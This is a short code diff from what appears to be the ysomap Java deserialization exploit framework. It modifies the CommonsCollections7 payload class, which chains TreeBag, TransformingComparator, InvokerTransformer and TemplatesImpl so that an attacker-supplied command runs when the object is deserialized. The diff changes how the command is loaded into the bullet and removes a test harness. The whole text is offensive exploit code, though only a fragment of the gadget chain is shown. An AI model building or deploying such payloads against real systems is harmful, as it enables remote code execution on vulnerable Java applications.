@@ -4,10 +4,9 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import org.apache.commons.collections4.bag.TreeBag;
 import org.apache.commons.collections4.comparators.TransformingComparator;
 import org.apache.commons.collections4.functors.InvokerTransformer;
-import ysomap.exception.GenerateErrorException;
-import ysomap.runner.PayloadTester;
 import ysomap.annotation.Authors;
 import ysomap.annotation.Dependencies;
+import ysomap.annotation.Require;
 import ysomap.gadget.ObjectGadget;
 import ysomap.gadget.bullet.TemplatesImplBullet;
 import ysomap.gadget.payload.Payload;
@@ -22,6 +21,7 @@ import ysomap.util.Reflections;
  */
 @SuppressWarnings({"rawtypes","unchecked"})
 @Dependencies({"org.apache.commons:commons-collections4:4.0"})
+@Require(bullets = {"TemplatesImplBullet"})
 @Authors({ Authors.NAVALORENZO })
 public class CommonsCollections7 extends Payload<TreeBag> {
 
@@ -54,14 +54,7 @@ public class CommonsCollections7 extends Payload<TreeBag> {
     }
 
     @Override
-    public ObjectGadget getDefaultBullet(String command) {
-        return new TemplatesImplBullet(command);
-    }
-
-    public static void main(String[] args) throws GenerateErrorException {
-        ObjectGadget bullet = new TemplatesImplBullet(null);
-        new PayloadTester(CommonsCollections7.class)
-                .setBullet(bullet)
-                .run();
+    public ObjectGadget getDefaultBullet(String command) throws Exception {
+        return new TemplatesImplBullet().set("body", command);
     }
 }
